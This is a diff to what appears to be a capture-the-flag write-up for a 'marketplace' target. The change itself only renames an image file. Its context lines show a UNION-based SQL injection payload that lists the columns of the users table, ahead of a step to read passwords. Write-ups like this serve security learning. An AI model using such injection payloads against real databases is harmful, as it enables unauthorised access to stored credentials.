@@ -79,7 +79,7 @@ Lets have a peak at Users as this might contain some useful information for the 
 UNION SELECT 1, GROUP_CONCAT(column_name), 3 ,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='users'
 ```
 
-![ColmnsUsers](./ColumnsUsers.PNG)
+![ColmnsUsers](./ColmnsUsers.PNG)
 
 Ok so look at passwords
 
